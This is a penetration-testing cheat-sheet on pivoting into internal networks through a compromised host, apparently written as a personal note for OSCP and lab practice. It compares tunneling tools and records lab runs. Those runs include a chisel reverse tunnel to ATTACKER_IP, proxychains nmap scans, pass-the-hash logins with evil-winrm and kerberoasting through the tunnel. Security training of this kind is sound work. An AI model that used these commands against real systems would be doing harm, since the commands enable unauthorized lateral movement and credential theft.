# Pivoting Methodology

When you need to reach an internal network through a compromised host.

## 1. Identify Internal Networks

```bash
# Linux
ip a
ip route
arp -a
cat /etc/resolv.conf
```

```cmd
# Windows
ipconfig /all
route print
arp -a
```

## 2. Choose Your Tool

| Situation | Tool | Why |
|---|---|---|
| Best overall | [[Ligolo-ng]] | Easiest, most reliable, no proxychains needed |
| Lightweight | [[Chisel]] | Single binary, HTTP tunnel |
| Already have SSH | [[SSH-Tunneling]] | No upload needed |
| Need SOCKS | [[Proxychains]] with any of the above | Wraps existing tools |

## 3. Workflow

1. Compromise pivot host
2. Identify internal subnets (`ip a`, `arp -a`, `route print`)
3. Set up tunnel using chosen tool
4. Scan internal network through tunnel
5. Exploit internal targets
6. If double pivot needed — chain tunnels ([[Ligolo-ng]] supports this natively)

## Key Concept

You are making internal IPs accessible from your Kali box so your tools work normally. The pivot host bridges your network to the internal network.

## Quick Decision

- Have SSH creds? Start with [[SSH-Tunneling]] or `sshuttle`
- Can upload a binary? Use [[Ligolo-ng]]
- HTTP only? Use [[Chisel]]
- Tool not working through proxy? Switch from [[Proxychains]] to [[Ligolo-ng]]

## From Your Boxes

> **Lab AD chain** (personal lab) — Pivoted from MS01 to internal DC01 and MS02 using chisel + proxychains
> - What worked: `chisel server -p 443 --reverse` on Kali, `.\chisel.exe client ATTACKER_IP:443 R:socks` on MS01, then `proxychains nmap -sT --top-ports 100 TARGET_IP` to scan internal targets
> - Lesson: After pivoting, use found creds + evil-winrm through proxychains to reach internal machines: `proxychains evil-winrm -u celia.almeda -H HASH -i TARGET_IP`

> **OSCP B — MS01/MS02** (Course) — Full pivot chain: chisel SOCKS from MS01, kerberoast DC through tunnel, ligolo for reverse callbacks from MS02
> - What worked: Chisel for initial SOCKS, then `proxychains impacket-GetUserSPNs` against DC. For reverse shell callbacks from internal MS02, used Ligolo listener forwarding back to Kali
> - Lesson: May need BOTH chisel (SOCKS to scan) and ligolo (reverse port forward for callbacks) in the same engagement. Chisel alone cannot easily handle reverse callbacks from deep internal targets

> **Nagoya** (PG/Windows) — Pivoted to reach internal MSSQL via chisel, then escalated with silver ticket
> - What worked: Chisel SOCKS to reach internal port 1433, `proxychains ./mssqlclient.py svc_mssql:REDACTED -windows-auth`
> - Lesson: Internal-only services (MSSQL not exposed externally) are prime pivot targets. Check `netstat -ano` after getting a shell
